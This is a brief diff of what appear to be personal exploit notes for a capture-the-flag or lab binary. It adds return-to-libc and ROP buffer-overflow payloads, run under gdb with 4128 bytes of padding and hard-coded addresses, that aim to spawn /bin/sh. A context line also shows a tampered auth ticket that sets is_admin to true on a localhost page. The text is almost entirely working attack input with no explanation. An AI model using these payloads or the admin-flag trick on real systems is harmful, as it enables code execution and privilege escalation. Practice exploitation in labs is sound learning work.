@@ -9,5 +9,10 @@ http://127.0.0.1/auth.php?ticket={%22username%22:%22shis%22,%22is_admin%22:%22tr
 
 (gdb) r -f `python -c 'print "a"*4128+"\x60\x21\xe4\xb7"+"\x90\x5c\xe3\xb7"+""'` 
 
+
+//rtl
 r -f `python -c 'print "a"*4128+"\x60\x21\xe4\xb7"+"\x80\xd1\x04\x08"+"\xb9\xf3\xff\xbf"'`
+
+// rop
+r -f `python -c 'print "a"*4128+"\x39\x91\x04\x08"+"\x80\xd1\x04\x08"+"\xaf\xb4\xe2\xb7"+"\x5f\x21\xe4\xb7"+"\xc7\xfd\xe7\xb7"+"a"*8+"\xd3\x88\x04\x08"+"\xc4\xe1\x04\x08"+"/bin/sh"'`
 
